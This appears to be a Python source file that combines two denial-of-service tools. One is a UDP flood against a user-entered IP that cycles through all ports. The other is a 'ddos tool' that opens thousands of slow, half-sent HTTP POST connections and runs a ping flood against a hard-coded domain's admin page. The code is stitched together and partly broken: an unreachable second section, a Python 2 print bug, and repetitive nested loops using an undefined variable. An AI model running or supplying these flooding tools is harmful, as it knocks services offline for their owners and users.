import socket
import random
import socket
import time
import threading
import os


# 构建socket通讯
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 构建字节数据包
byte = random._urandom(1490)


ip = input("IP Dress: ")
port = input("Port(Leave a blank to attack all of the ports): ")


if port == "":
    port = 1
    re = True
else:
    port = int(port)
    re = False

sent = 0

while True:
    sock.sendto(byte, (ip, port))
    sent = sent + 1
    print
    "Sent %s packet to %s throught port %s." % (str(sent), ip, str(port))

    if re:
        port = port + 1
    else:
        pass

    if port == 65534:
        port = 1



# Pressure Test,ddos tool

# ---------------------------
MAX_CONN = 20000
PORT = 80
HOST = "www.a306.wang"  # 在双引号里输入对方IP或域名，要保证他联网了或开机了.
PAGE = "/htgl.php"
# ---------------------------

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))


os.system("ping -n 100 -l 100 " + HOST)
socks = []


def ddos():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while 1:
        s.connect((HOST, PORT))
        s.send(buf.encode())
        s.send(buf.encode())
        s.send(buf.encode())


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            s.send(buf.encode())
            s.send(buf.encode())
            print("Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("Could not connect to server or send error:%s" % ex)
            time.sleep(0.1)


# end def

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                # print "send OK!"
            except Exception as ex:
                print("Send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)


# end def

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())

conn_th.start()
send_th.start()
ddos()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while 1:
    s.connect((HOST, PORT))
    s.send(buf.encode())
    s.send(buf.encode())
    s.send(buf.encode())
    print("Send buf OK!,conn=%d\n" % i)
    while 1:
        s.connect((HOST, PORT))
        s.send(buf.encode())
        s.send(buf.encode())
        s.send(buf.encode())
        print("Send buf OK!,conn=%d\n" % i)
        while 1:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            s.send(buf.encode())
            s.send(buf.encode())
            print("Send buf OK!,conn=%d\n" % i)
            while 1:
                s.connect((HOST, PORT))
                s.send(buf.encode())
                s.send(buf.encode())
                s.send(buf.encode())
                print("Send buf OK!,conn=%d\n" % i)
                while 1:
                    s.connect((HOST, PORT))
                    s.send(buf.encode())
                    s.send(buf.encode())
                    s.send(buf.encode())
                    print("Send buf OK!,conn=%d\n" % i)
                    while 1:
                        s.connect((HOST, PORT))
                        s.send(buf.encode())
                        s.send(buf.encode())
                        s.send(buf.encode())
                        print("Send buf OK!,conn=%d\n" % i)